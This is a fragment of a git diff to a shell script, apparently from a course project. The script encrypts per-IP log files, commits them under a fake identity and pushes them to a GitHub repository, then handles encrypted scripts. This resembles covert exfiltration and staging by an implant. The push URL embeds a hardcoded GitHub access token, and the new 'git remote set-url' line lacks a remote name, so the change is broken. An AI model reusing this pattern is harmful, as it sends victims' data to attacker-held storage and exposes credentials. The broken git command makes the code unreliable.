@@ -16,6 +16,8 @@ rm chrdev0
 # encrypt
 openssl rsautl -encrypt -inkey key_public.pem -pubin -in "logs/$ip.txt" -out "logs/$ip.enc"
 
+
+
 git config user.email "fake@gmail.com"
 git config user.name "dummy000000"
 
@@ -26,7 +28,8 @@ git add .
 git commit -m "update"
 
 # push
-git push https://dummy000000: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@github.com/Sad-0w/CS564_data.git
+git remote set-url https://dummy000000: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@github.com/Sad-0w/CS564_data.git
+git push
 
 # extract all encrypted scripts
 for file in ./scripts/*.enc
